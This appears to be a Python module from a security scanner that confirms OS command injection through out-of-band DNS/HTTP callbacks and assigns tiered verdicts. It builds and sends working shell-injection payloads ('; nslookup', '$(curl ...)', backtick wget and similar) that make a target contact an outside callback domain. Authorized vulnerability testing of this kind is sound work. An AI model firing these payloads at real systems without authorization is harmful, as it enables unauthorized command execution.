# ==============================================================================
# OS command-injection (cmdi) confirmation via out-of-band (OOB) interaction — the THIRD
# vuln type, and the SECOND to use the OOB proof shape (after SSRF). It is CONFIRMED only by
# a REAL callback that is CAUSALLY tied to a payload WE injected into THIS candidate: when the
# target's shell executes an injected command, it reaches out to a UNIQUE interactsh domain we
# minted, and the received interaction's token must correspond ONE-TO-ONE to the token minted for
# a payload we ACTUALLY DISPATCHED on this probe. The interaction IS the DeterministicProof; there
# is no other path to CONFIRMED.
#
# INJECTION-CAUSAL CORRELATION (the reservation that closes the false-CONFIRMED hole):
#   * A UNIQUE token (fresh CSPRNG domain) is minted PER injected payload — not one shared token
#     per session/probe — so a received callback pins to the EXACT payload that landed.
#   * A token counts only if its payload was ACTUALLY DISPATCHED to the target on this probe
#     (`injected_tokens`). A token we minted but never sent (a send that errored), a token from a
#     different candidate's probe, or a coincidental/polluted-infra callback carrying some other
#     session token, is NOT in `injected_tokens` and therefore CANNOT confirm.
#   * TRUSTED OOB INFRASTRUCTURE IS A PRECONDITION: the guarantee is "a command we injected into this
#     candidate triggered a token-matched out-of-band callback." A malicious interactsh server that
#     fabricates a callback for a token it observed us inject is out of scope (documented in CMDI.md).
#
# ADDITIVE + ISOLATED (mirrors ssrf_detector.py): this module does NOT import or touch the
# access-control path (deep_verifier / fuzzer verdict logic / confirm_render / the owner-view
# gate) and does NOT modify the shared tier framework. It COMPOSES two existing, audited pieces
# — the OOB client (`services/oob/`, REUSED, not forked) and the tiered-verdict framework
# (`services/verdict_tiers.py`) — and adds a cmdi-specific payload set + probe + detector.
#
# THE RESERVATION (why a bluff can never be CONFIRMED):
#   * `CmdiOobDetector` declares `max_tier = CONFIRMED` (a causally-tied callback is a physical
#     fact), and `classify()` enforces that ceiling.
#   * `assess()` calls `Verdict.confirmed(...)` ONLY when the result is `confirmed` — a correlated
#     interaction whose token is in `injected_tokens`. A weaker inference signal (echoed command
#     output, or a measured time delay) is `SIGNAL` at most — NEVER CONFIRMED. No signal at all ->
#     REFUTED; could not probe -> NOT_DATA. `Verdict.confirmed` itself refuses to exist without a proof.
# ==============================================================================
from __future__ import annotations

import time
import urllib.parse
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional

from backend.app.services.oob import OOBError, OOBInteraction, OOBSession, open_session
from backend.app.services.verdict_tiers import (
    DeterministicProof, Detector, Tier, Verdict, classify,
)

# Public ProjectDiscovery interactsh servers (no self-hosting). Tried in order; the first
# that registers wins. A reachable server is REQUIRED for a real OOB confirmation.
DEFAULT_OOB_SERVERS = ("oast.online", "oast.fun", "oast.me", "oast.pro", "oast.live", "oast.site")

_HTTP_TIMEOUT = 15.0
# A response slower than this (ms) is treated as a possible time-delay INFERENCE lead -> SIGNAL
# (never CONFIRMED). High on purpose: a normal response must not trip it.
_TIME_DELAY_SIGNAL_MS = 4000.0


# ------------------------------------------------------------------------------
# Payload generation — per injection context, each triggers a callback to a domain.
# ------------------------------------------------------------------------------
# Callback commands that resolve/fetch the OOB domain. `nslookup` is the primary (DNS, present
# on Windows AND Unix; interactsh captures the DNS interaction); curl/wget cover HTTP where a
# resolver is filtered. `{d}` is the unique OOB domain (carrying the per-payload token).
_CALLBACK_COMMANDS = (
    "nslookup {d}",
    "curl http://{d}/",
    "wget -q -O- http://{d}/",
)
# Context wrappers that break out of a naive `prog <arg>` shell concatenation. Cover POSIX sh
# (`;` `|` `$(...)` backticks newline) AND Windows cmd.exe (`&` `&&` `|`), so at least one fires
# whatever shell the sink uses. `{c}` is a callback command.
_CONTEXT_WRAPPERS = (
    "; {c}",
    "| {c}",
    "& {c}",
    "&& {c}",
    "|| {c}",
    "\n{c}\n",
    "$({c})",
    "`{c}`",
    "; {c} #",
)


def _payload_templates() -> List[str]:
    """Context x command templates, each still carrying a `{d}` slot for a UNIQUE OOB domain. The
    probe mints one domain (hence one token) PER template so a received callback pins to the exact
    payload injected. Pure + deterministic (order stable)."""
    out: List[str] = []
    for cmd_t in _CALLBACK_COMMANDS:
        for ctx in _CONTEXT_WRAPPERS:
            out.append(ctx.replace("{c}", cmd_t))     # e.g. "; nslookup {d}" (still has {d})
    return out


def cmdi_payloads(domain: str) -> List[str]:
    """The battery of command-injection payload STRINGS for one OOB `domain` (every template
    filled). Kept for payload-generation tests; the probe mints a UNIQUE domain per template
    instead of reusing one (see `run_cmdi_probe`). Each, if it lands in a shell, makes the target
    resolve/fetch `domain` — an out-of-band callback. The raw strings are never logged (see `result_view`)."""
    return [t.replace("{d}", domain) for t in _payload_templates()]


@dataclass
class CmdiProbeResult:
    """The full record of one cmdi probe. CONFIRMED requires a correlated interaction whose token
    was ACTUALLY INJECTED into this candidate on this probe (`matched_token in injected_tokens`) —
    not merely minted in the session. `echoed_marker` / `max_response_ms` are weaker INFERENCE leads
    (echoed output / time delay) that can reach SIGNAL at most."""
    target: str
    method: str
    param: str
    param_location: str
    oob_server: Optional[str]
    correlation_id: str = ""                 # the session correlation shared by this probe's payloads
    payloads_tried: int = 0                  # payload variants built (one unique token minted each)
    injected_tokens: List[str] = field(default_factory=list)   # tokens whose payload was DISPATCHED to the target
    request_status: Optional[int] = None
    request_error: Optional[str] = None      # error sending a probe to the target (not fatal)
    probe_error: Optional[str] = None        # could not run the probe at all -> NOT DATA
    interactions: List[OOBInteraction] = field(default_factory=list)   # callbacks correlated to an INJECTED token
    matched_token: Optional[str] = None      # the injected token a callback correlated to (the causal link)
    matched_domain: Optional[str] = None     # that token's unique probe domain (the proof identifier)
    echoed_marker: bool = False              # a response body echoed our unique domain/token (inference)
    max_response_ms: Optional[float] = None  # slowest probe response (inference: time delay)
    polls: int = 0

    @property
    def confirmed(self) -> bool:
        """CONFIRMED requires a correlated interaction whose token was ACTUALLY INJECTED into this
        candidate on this probe (`matched_token in injected_tokens`) — not merely minted in the
        session. A callback for a token we never dispatched (a failed send, a different candidate's
        token, or a coincidental / polluted-infra hit) does NOT confirm."""
        return (not self.probe_error
                and bool(self.interactions)
                and self.matched_token is not None
                and self.matched_token in self.injected_tokens)

    @property
    def has_inference_signal(self) -> bool:
        """A weaker-than-proof lead: echoed output, or a response slow enough to suggest a
        blocking injected command. Never sufficient for CONFIRMED — only SIGNAL."""
        return bool(self.echoed_marker) or (
            self.max_response_ms is not None and self.max_response_ms >= _TIME_DELAY_SIGNAL_MS)


def _interaction_view(it: OOBInteraction) -> Dict[str, Any]:
    """A structural, secret-free view of one OOB interaction (for the proof/evidence)."""
    return {
        "protocol": it.protocol,
        "unique_id": it.unique_id,
        "q_type": it.q_type,
        "remote_address": it.remote_address,
        "timestamp": it.timestamp,
    }


class CmdiOobDetector(Detector):
    """OS command injection via OOB callback. Deterministic (an injection-causal interaction is a
    physical fact), so it MAY reach CONFIRMED — but only when `assess` is handed a probe result whose
    correlated interaction is token-matched to a payload we actually injected. A weaker inference lead
    (echo / time delay) is SIGNAL; no signal -> REFUTED; could not probe -> NOT_DATA. Never CONFIRMED
    on a callback we cannot causally tie to our own injection into this candidate."""
    name = "cmdi-oob"
    max_tier = Tier.CONFIRMED

    def assess(self, evidence: CmdiProbeResult) -> Verdict:
        if evidence.probe_error:
            return Verdict.not_data(
                f"the cmdi OOB probe could not run: {evidence.probe_error}. No callback could be "
                f"observed, so nothing is confirmed or refuted (NOT DATA).")
        if evidence.confirmed:
            it = evidence.interactions[0]
            proof = DeterministicProof(
                channel="cmdi_oob_callback",
                basis=(f"the target executed a command we injected into {evidence.param!r} on this probe "
                       f"and made an out-of-band {it.protocol.upper()} callback to the unique probe domain "
                       f"{evidence.matched_domain} (interaction id {it.unique_id}"
                       + (f", q-type {it.q_type}" if it.q_type else "")
                       + (f", from {it.remote_address}" if it.remote_address else "")
                       + f") — the callback's token corresponds one-to-one to the payload we dispatched, "
                       f"proving server-side OS command execution."))
            return Verdict.confirmed("cmdi", proof)
        if evidence.has_inference_signal:
            how = "echoed command output" if evidence.echoed_marker else (
                f"a response delay of ~{evidence.max_response_ms:.0f} ms")
            return Verdict.signal(
                "cmdi",
                f"a weaker inference lead ({how}) suggests command injection, but NO out-of-band "
                f"callback correlated to any of the {len(evidence.injected_tokens)} token(s) we injected "
                f"into {evidence.param!r} arrived — a SIGNAL to verify by hand, never a deterministic "
                f"confirmation.")
        return Verdict.refuted(
            "cmdi",
            f"no out-of-band callback correlated to any of the {len(evidence.injected_tokens)} unique "
            f"token(s) we injected into {evidence.param!r} arrived within the poll window "
            f"({evidence.polls} polls), and no inference lead was seen — the injected command did not "
            f"execute server-side (or the target cannot reach the interactsh server).")


def cmdi_verdict(result: CmdiProbeResult) -> Verdict:
    """The single emit path: run the detector through `classify` so the CONFIRMED ceiling and
    the proof requirement are structurally enforced (identical discipline to ssrf_verdict)."""
    return classify(CmdiOobDetector(), result)


# ------------------------------------------------------------------------------
# The probe: mint a UNIQUE OOB domain per injected payload, send each to the target, then poll
# the OOB session for a callback correlated to a token we actually injected.
# ------------------------------------------------------------------------------
def _open_default_session(servers) -> OOBSession:
    last: Optional[Exception] = None
    for server in servers:
        try:
            return open_session(server)
        except Exception as e:  # OOBError / transport / network
            last = e
    raise OOBError(f"no public interactsh server reachable (tried {list(servers)}): {last}")


def _build_target_url(base_url: str, path: str, param: str, value: str) -> str:
    """Compose the target URL with `value` in a QUERY parameter (URL-encoded)."""
    base = base_url.rstrip("/")
    p = path if path.startswith("/") else "/" + path
    parts = urllib.parse.urlsplit(p)
    query = dict(urllib.parse.parse_qsl(parts.query, keep_blank_values=True))
    query[param] = value
    return f"{base}{parts.path}?{urllib.parse.urlencode(query)}"


def _default_http_send(*, target_url: str, method: str, headers: Dict[str, str],
                       body: Optional[Dict[str, Any]]) -> Dict[str, Any]:
    """Send one probe request to the TARGET (a plain in-scope request; the payload is injected
    DATA the target's shell is expected to execute). Returns {status_code, body, elapsed_ms}.
    verify=False for self-signed lab/pentest targets, mirroring the engine."""
    import httpx
    with httpx.Client(timeout=_HTTP_TIMEOUT, verify=False) as client:
        start = time.monotonic()
        resp = client.request(method.upper(), target_url, headers=headers or None, json=body)
        elapsed_ms = (time.monotonic() - start) * 1000.0
        return {"status_code": resp.status_code, "body": resp.text[:4096], "elapsed_ms": elapsed_ms}


def run_cmdi_probe(
    *,
    base_url: str,
    method: str = "GET",
    path: str = "/",
    param: str = "cmd",
    param_location: str = "query",
    oob_servers = DEFAULT_OOB_SERVERS,
    attacker_token: Optional[str] = None,
    poll_seconds: float = 25.0,
    poll_interval: float = 3.0,
    # test seams (offline; no network):
    session_factory: Optional[Callable[[], OOBSession]] = None,
    http_send: Optional[Callable[..., Dict[str, Any]]] = None,
    sleep: Callable[[float], None] = time.sleep,
) -> CmdiProbeResult:
    """Confirm OS command injection by an injection-causal out-of-band callback. Opens an interactsh
    session, and for EACH payload variant mints a UNIQUE domain/token, injects it into `param`, and
    sends the request to the target — recording the token as INJECTED only if the send was actually
    dispatched. It then polls the OOB session and accepts ONLY a callback whose token is one we
    injected (the causal link). Also records weaker inference leads (echoed domain, slow response) for
    a SIGNAL — never a confirmation. Never raises for expected failures — a probe that cannot run
    returns `probe_error` (NOT DATA)."""
    if param_location not in ("query", "body"):
        param_location = "query"
    # 1) open the OOB session (a reachable interactsh server is required to confirm anything).
    try:
        session = (session_factory or (lambda: _open_default_session(oob_servers)))()
    except Exception as e:
        return CmdiProbeResult(
            target=base_url, method=method.upper(), param=param, param_location=param_location,
            oob_server=None, probe_error=f"OOB session unavailable: {type(e).__name__}: {e}")

    result = CmdiProbeResult(
        target=base_url, method=method.upper(), param=param, param_location=param_location,
        oob_server=session.server, correlation_id=session.correlation_id)
    try:
        headers: Dict[str, str] = {}
        if attacker_token:
            from backend.app.cli.external_verify import _auth_header
            headers.update(_auth_header(attacker_token))
        sender = http_send or _default_http_send
        templates = _payload_templates()
        result.payloads_tried = len(templates)

        # 2) mint a UNIQUE token per payload variant and inject it; a token is recorded as INJECTED
        #    only when its request was actually dispatched (the causal link to THIS candidate).
        last_status: Optional[int] = None
        for tmpl in templates:
            p = session.new_payload()                       # fresh unique domain+token per injection
            pstr = tmpl.replace("{d}", p.domain)
            if param_location == "body":
                target_url = f"{base_url.rstrip('/')}{path if path.startswith('/') else '/' + path}"
                body: Optional[Dict[str, Any]] = {param: pstr}
            else:
                target_url = _build_target_url(base_url, path, param, pstr)
                body = None
            try:
                resp = sender(target_url=target_url, method=method.upper(), headers=headers, body=body)
            except Exception as e:
                result.request_error = f"{type(e).__name__}: {e}"
                continue                                    # NOT dispatched -> token is NOT injected
            result.injected_tokens.append(p.token)          # dispatched into THIS candidate (causal link)
            # Normalize: a sender may return a plain int status (compat) or a rich dict.
            if isinstance(resp, dict):
                last_status = resp.get("status_code", last_status)
                rbody = str(resp.get("body") or "")
                if p.token in rbody or p.domain in rbody:
                    result.echoed_marker = True             # echoed output (inference -> SIGNAL only)
                ems = resp.get("elapsed_ms")
                if ems is not None:
                    result.max_response_ms = max(result.max_response_ms or 0.0, float(ems))
            else:
                last_status = resp
        result.request_status = last_status

        # 3) poll for a callback correlated to a token WE ACTUALLY INJECTED (the only path to CONFIRMED).
        injected = set(result.injected_tokens)
        elapsed = 0.0
        while elapsed < poll_seconds and not result.interactions:
            sleep(poll_interval)
            elapsed += poll_interval
            result.polls += 1
            try:
                grouped = session.poll_and_correlate()
            except OOBError as e:
                result.probe_error = f"OOB poll failed: {type(e).__name__}: {e}"
                break
            for token, hits in grouped.items():
                if hits and token in injected:              # causal gate: an INJECTED token only
                    result.interactions = hits
                    result.matched_token = token
                    issued = session.issued.get(token)
                    result.matched_domain = issued.domain if issued else None
                    break
        return result
    finally:
        try:
            session.close()
        except Exception:
            pass


def result_view(result: CmdiProbeResult, verdict: Verdict) -> Dict[str, Any]:
    """Machine-readable, secret-free view of a cmdi probe + its tiered verdict. The raw payload
    STRINGS (weaponized shell commands) and raw tokens are NOT included — only the count tried, the
    count actually injected, and the matched proof DOMAIN (which embeds only the ephemeral OOB nonce,
    exactly as the SSRF detector reports) — so nothing weaponized is logged."""
    from backend.app.services.verdict_tiers import badge
    return {
        "vuln_type": "cmdi",
        "tier": verdict.tier.name.lower(),
        "badge": badge(verdict),
        "confirmed": verdict.tier is Tier.CONFIRMED,
        "basis": verdict.basis,
        "proof_channel": verdict.proof.channel if verdict.proof else None,
        "target": result.target,
        "method": result.method,
        "param": result.param,
        "param_location": result.param_location,
        "matched_domain": result.matched_domain,          # the proof domain (set only when confirmed)
        "payloads_tried": result.payloads_tried,
        "payloads_injected": len(result.injected_tokens),
        "oob_server": result.oob_server,
        "request_status": result.request_status,
        "request_error": result.request_error,
        "probe_error": result.probe_error,
        "echoed_marker": result.echoed_marker,
        "max_response_ms": result.max_response_ms,
        "polls": result.polls,
        "interactions": [_interaction_view(i) for i in result.interactions],
    }
